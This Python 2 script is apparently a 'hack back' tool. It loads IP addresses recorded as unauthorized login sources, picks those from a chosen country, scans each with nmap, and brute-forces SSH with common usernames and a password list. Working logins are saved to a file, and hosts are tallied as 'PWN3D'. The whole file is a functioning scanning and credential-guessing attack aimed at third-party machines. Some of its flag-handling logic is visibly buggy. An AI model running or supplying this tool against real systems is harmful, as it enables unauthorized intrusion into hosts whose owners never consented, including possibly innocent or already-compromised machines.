import multiprocessing
import paramiko
import random
import time
import sys
import os

import warnings                                       # SUPRESSING PARAMIKO WARNINGS!
warnings.filterwarnings(action='ignore',module='.*paramiko.*')


def get_base_path():
    pwd = os.getcwd()
    os.chdir(os.path.dirname(os.getcwd()))
    resource_base = os.getcwd()
    os.chdir(pwd)
    return resource_base


base = get_base_path()


def swap(file_name, destroy):
    data = []
    for line in open(file_name, 'r').readlines():
        data.append(line.replace('\n', ''))
    if destroy:
        os.remove(file_name)
    return data


def cmd(command):
    os.system(command+' >> cmd.txt')
    return swap('cmd.txt', True)


def load_countries():
    codes = {}
    for line in swap(base+'/countrycodes.txt', False):
        country_name = line.split(';')[0]
        country_code = line.split(';')[1]
        codes[country_code] = country_name
    return codes


def pull_rogue_ip_list():
    counter = {}
    for line in swap(base+'/OSINT/unique.txt', False):
        ip = line.split(' : ')[0]
        try:
            login_attempts = line.split(' : ')[1]
        except IndexError:
            login_attempts = 0
            pass
        counter[ip] = int(login_attempts)
    return list(set(counter.keys())), counter


def retrieve_unauthorized_origins():
    c_codes = load_countries()
    tic = time.time()
    counts = {}
    countries = {}
    unique = 0
    for country, code in c_codes.iteritems():
        counts[code] = 0
        countries[c_codes[country]] = []
    if os.path.isfile(base+'/OSINT/locales.txt'):
        for line in swap(base+'/OSINT/locales.txt', False):
            ip = line.split(' : ')[0]
            country = line.split(' : ')[1]
            counts[country] += 1
            countries[country].append(ip)
            unique += 1
    else:
        print '[!!] Locales file Missing!'
        exit()
    print '=== FINISHED Retrieving %d Unauthorized Login Sources [%ss Elapsed] ===' % \
          (unique, str(time.time() - tic))
    return countries, counts, c_codes


def create_ssh_connection(ip_address, uname, password):
    success = False
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    response = ''
    try:
        client.connect(ip_address, username=uname, password=password)
        ssh_session = client.get_transport().open_session()
        if ssh_session.active:
            ssh_session.exec_command('whoami')
            response = ssh_session.recv(1500)
            success = True
    except paramiko.SSHException:
        pass
    except paramiko.ssh_exception.NoValidConnectionsError:
        pass
    return success, response


def attempt(ip,uname,passwd):
    print '.. Trying %s@%s:%s' % (uname, ip, passwd)
    win = ''
    connected = False
    try:
        connected, reply = create_ssh_connection(ip, uname, passwd)
    except: # TODO: Be more precise here
        connected = False
        pass
    if connected:
        print '\033[1m[**] \033[34mSuccessfully Logged into %s@%s:%s\033[0m' % \
              (uname, ip, passwd)
        if not os.path.isfile('success.txt'):
            open('success.txt','w').write('=== SUCCESSFUL SSH LOGINS ===\n')
        if os.path.isfile('success.txt'):
            win = '%s@%s : password=%s\n' % (uname, ip, passwd)
            open('success.txt', 'a').write(win)
    return connected, win


def hack_back(ip, determined):
    p = multiprocessing.Pool(processes=4)
    success = {}
    names = ['root', 'admin', 'user']  #
    start = time.time()
    connected = False
    common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
    if determined:
        for entry in swap('common_passwords.txt', False):
            common.append(entry)
        # random.shuffle(common
    else:
        for entry in swap('common_passwords.txt', False)[0:40]:
            common.append(entry)
    print '... Bruteforcing %s' % ip
    for u in names:
        for pw in common:
            try:
                event = p.apply_async(func=attempt, args=(ip, u, pw))
                connected, success = event.get(timeout=120)
            except multiprocessing.TimeoutError:
                connected = False; success = ''
                pass
            if connected:
                break
        if connected:
            break
    if not connected:
        print '...Failed to bruteforce after %d attempts [%ss Elapsed]' %\
              (len(common)*len(names), time.time()-start)
    return connected, success


def blunt_force_attack(address, strong):
    pwns = {}
    bruted = False
    open_ports = []
    filtered_ports = []
    if not os.path.isfile('success.txt'):
        open('success.txt', 'w').write('=== SUCCESSFUL SSH LOGINS ===\n')
    scan = 'nmap -p T:21-25 %s >> scan.txt' % address
    # scan = 'nmap -p U:53,135,137,T:21-25,80,139,8080,5000 %s >> scan.txt' % address
    print '\033[1m========= \033[31mScanning %s \033[0m\033[1m=========\033[0m' % address
    for line in cmd(scan):
        # p = Pool(processes=4)
        try:
            if line.split(' open ')[1]:
                try:
                    port = int(line.split('/')[0])
                    open_ports.append(port)
                    print '[*] %d is Open' % port
                    if port == 22:  # SSH
                        t0 = time.time()
                        bruted, credentials = hack_back(address, strong)
                        if bruted:
                            pwns[address] = credentials
                            print '!! Bruteforcecd in %s second' % str(time.time()-t0)
                except IndexError:
                    pass

        except IndexError:
            pass
        try:
            if line.split(' filtered ')[1]:
                try:
                    port = int(line.split('/')[0])
                    filtered_ports.append(port)
                    print '[*] %d is filtered' % port
                    if port == 22:  # SSH
                        attacking = True
                except ValueError:
                    pass
        except IndexError:
            pass
    return bruted, pwns


def spray(ip_locations, country_codes, intense):
    locale = sys.argv[2]
    if locale in country_codes.keys():
        target = country_codes[locale]
    elif locale.upper() in country_codes.values():
        for k in random.shuffle(country_codes.keys()):
            if country_codes[k] == locale.upper():
                target = country_codes[k]
    targets = ip_locations[target]
    print '[*] %d Targets Acquired From %s' % (len(targets), target)
    # Shuffle targets to I'm not hitting the first ones on the list repeatedly
    random.shuffle(targets)
    tic = time.time()
    pwn_count = 0
    if intense:
        print '[*] INTENSE Mode Enabled'
    # Scan Open Ports
    for address in targets:
        try:
            pwned, data = blunt_force_attack(address, intense)
            if pwned:
                pwn_count += 1
        except KeyboardInterrupt:
            print '\n [!!] ATTACK KILLED [%ss Elapsed]' % str(time.time() - tic)

    print '\033[1m[*] Finished Scanning \033[32m%d Hosts\033[0m\033[1m in \033[35m%s\033[0m\033[1m seconds \033[0m' %\
          (len(targets), str(time.time() - tic))
    print '\033[1m[*] \033[31m%d\033[0m \033[1m Machines PWN3D\033[0m' % pwn_count


if __name__ == '__main__':
    brute_force = True
    rogue_ips, login_attempts = pull_rogue_ip_list()
    ip_loc, c_counts, c_codes = retrieve_unauthorized_origins()

    if '!!' in sys.argv:
        brute_force = True

    if 'light' or '-l' in sys.argv:
        brute_force = False

    if 'target' in sys.argv:
        spray(ip_locations=ip_loc, country_codes=c_codes, intense=brute_force)

    if 'test' in sys.argv:
        blunt_force_attack('10.0.0.5', True)
